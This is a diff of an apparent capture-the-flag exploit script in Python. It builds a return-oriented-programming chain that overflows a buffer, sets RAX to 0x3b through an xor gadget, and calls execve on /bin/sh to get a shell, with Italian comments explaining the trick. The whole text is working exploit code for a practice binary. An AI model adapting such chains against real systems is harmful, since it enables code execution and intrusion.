@@ -57,16 +57,26 @@ continue
 BIN_SH = 0x404000
 POP_RDI_RET = 0x401032
 SYSCALL = 0x40101a
+XOR_RAX_RDI_RET = 0x401038
+POP_RDX_RET = 0x401036
+POP_RSI_RET = 0x401034
 
 io = start()
 
-io.sendlineafter(b"> ", b"/bin/sh")
+io.sendafter(b"> ", b"/bin/sh")
 
 payload = flat(
         b"A" * 32,
         b"B" * 8,
         p64(POP_RDI_RET),
+        p64(0x3b), 
+        p64(XOR_RAX_RDI_RET),
+        p64(POP_RDI_RET),
         p64(BIN_SH),
+        p64(POP_RDX_RET),
+        p64(0x0),
+        p64(POP_RSI_RET),
+        p64(0x0),
         p64(SYSCALL)
     )
 
@@ -77,3 +87,7 @@ io.interactive()
 
 # devo riuscire a salvare 59 = 0x3b su RAX
 # la syscall READ salva su RAX il numero di bytes letti
+# non posso manipolare la read, ma c'è uno xor rax, rdi che noi
+# controlliamo quindi possiamo azzerare RAX e poi poppare su RDI un valore 
+# che xorato con RAX fa esattamente 0x3b syscall di execv 
+# dopo poppiamo /bin/sh su RDI e azzeriamo RSI e RDX e poi chiamiamo syscall
